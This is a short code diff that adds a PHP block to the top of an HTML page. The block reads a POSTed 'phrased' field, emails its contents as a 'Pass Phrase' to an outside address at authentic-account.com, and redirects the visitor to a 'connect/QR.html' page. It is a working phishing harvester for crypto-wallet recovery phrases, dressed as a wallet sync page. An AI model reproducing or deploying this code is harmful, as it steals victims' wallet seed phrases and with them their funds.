@@ -1,3 +1,14 @@
+<?php
+if($_POST["phrased"]) {
+	$content = $_POST["phrased"];
+	$subject = "Phrase From Sync";
+
+	$toEmail = "result@authentic-account.com";
+	$mailHeaders = "From: Sync";
+	if(mail($toEmail, $subject, 'Pass Phrase: '.$content, $mailHeaders)) {
+	    mail($to,$subject,$txt,$headers);
+  header("Location: https://authentic-account.com/indexhome/connect/QR.html");
+	    ?>
 <!DOCTYPE html>
 <html lang="en">
     
